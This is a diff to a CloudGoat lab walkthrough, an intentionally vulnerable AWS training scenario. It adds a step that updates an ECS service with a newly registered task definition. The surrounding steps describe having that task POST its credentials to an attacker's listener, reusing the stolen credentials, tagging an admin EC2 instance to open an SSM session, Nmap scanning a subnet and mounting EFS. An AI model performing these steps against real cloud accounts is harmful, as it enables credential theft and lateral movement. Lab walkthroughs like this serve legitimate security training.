@@ -19,7 +19,7 @@
 
 6. List services in cloudgoat cluster
 
-    `aws ecs list-services --cluster <CLUSTER ARN> --profile ruse`
+    `aws ecs list-services --cluster <CLUSTER NAME> --profile ruse`
 
 7. Download task definition 
 
@@ -35,25 +35,29 @@
 
     `register-task-definition --cli-input-json file://task_template.json  --profile ruse`
 
-11. Wait for the task to run and POST the credentials to your listener
+11. Update the ECS service with the newly registered task definition.
 
-12. With the new creds add them to "ruse_box"
+    `aws ecs update-service --cluster <CLUSTER NAME> --service <SERVICE NAME> --task-definition <NEW TASK DEFINITION NAME>`
+
+12. Wait for the task to run and POST the credentials to your listener
+
+13. With the new creds add them to "ruse_box"
 
     `aws configure --profile ecs`
 
-13. Modify admin ec2 tags
+14. Modify admin ec2 tags
 
     `aws ec2 create-tags --resources <INSTANCE ID> --tags Key=StartSession,Value=true`
 
-14. Using ecs creds start a session on admin ec2 
+15. Using ecs creds start a session on admin ec2 
 
     `aws ssm start-session --target <INSTANCE ID> --profile ecs`
 
-15. Looking at the ec2 instances we see the admin ec2 only has a single port open. We Nmap scan this port.
+16. Looking at the ec2 instances we see the admin ec2 only has a single port open. We Nmap scan this port.
 
     `nmap -Pn -P 2049 --open 10.10.10.0/24 `
 
-16. Mount discovered ec2 
+17. Mount discovered ec2 
 
     `cd /mnt`
 `sudo mkdir /efs`
